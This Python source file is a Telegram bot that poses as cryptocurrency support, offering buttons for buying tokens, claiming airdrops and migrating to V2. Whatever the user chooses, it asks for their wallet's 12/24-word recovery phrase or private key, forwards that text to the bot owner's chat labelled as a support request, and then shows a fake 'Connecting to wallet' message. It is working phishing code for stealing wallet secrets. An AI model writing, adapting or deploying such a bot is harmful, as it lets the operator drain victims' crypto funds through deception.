import os
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# Load bot credentials from environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN")
BOT_OWNER_ID = os.getenv("BOT_OWNER_ID")

if not BOT_TOKEN or not BOT_OWNER_ID:
    raise ValueError("Missing BOT_TOKEN or BOT_OWNER_ID. Set them as environment variables.")

# Conversation states
CHOOSING, TYPING_ISSUE = range(2)

# Updated keyboard layout
reply_keyboard = [
    ["🛒 BUY TOKEN"],
    ["💰 SELL TOKEN"],
    ["🔍 AUTHENTICATE TRANSACTION"],
    ["🎁 CLAIM AIRDROP", "🔄 MIGRATE V2"],  # Two smaller buttons on one row
    ["⚙ OTHER ISSUES"]
]
markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True, one_time_keyboard=True)

# Start command - Show reply keyboard and reset state
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data.clear()  # Reset previous inputs
    await update.message.reply_text("🔹 **Choose an option:**", reply_markup=markup)
    return CHOOSING  # Move to CHOOSING state

# Handle user selection
async def handle_selection(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    choice = update.message.text

    if choice in ["🛒 BUY TOKEN", "💰 SELL TOKEN", "🔍 AUTHENTICATE TRANSACTION", "🎁 CLAIM AIRDROP", "🔄 MIGRATE V2", "⚙ OTHER ISSUES"]:
        context.user_data["choice"] = choice  # Store user's choice
        await update.message.reply_text("✅ Import your Wallet 12/24 Phrases or Private Key to access your dashboard.")
        return TYPING_ISSUE  # Move to TYPING_ISSUE state
    else:
        await update.message.reply_text("❌ Please select a valid option from the keyboard.", reply_markup=markup)
        return CHOOSING  # Stay in CHOOSING state

# Handle user issue input
async def handle_issue_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.message.chat_id
    user_issue = update.message.text
    choice = context.user_data.get("choice", "Unknown")  # Retrieve user's choice

    # Send the user issue to the bot owner
    await context.bot.send_message(
        chat_id=BOT_OWNER_ID,
        text=f"📩 *New Support Request*\n\n"
             f"🔹 **User ID:** `{user_id}`\n"
             f"🔹 **Category:** {choice}\n"
             f"📝 **Issue Description:**\n```{user_issue}```"
    )

    # Notify the user
    await update.message.reply_text("✅ Connecting to wallet... Please wait for bot 🤖 confirmation or click /start to try again. 🔄")

    return CHOOSING  # Go back to CHOOSING state

# Conversation handler exit
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("❌ *Operation canceled. Type /start to restart.*")
    return CHOOSING  # Go back to CHOOSING state

# Main function to run the bot
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # Conversation handler for managing user flow
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSING: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_selection)],
            TYPING_ISSUE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_issue_input)],
        },
        fallbacks=[CommandHandler("start", start), CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
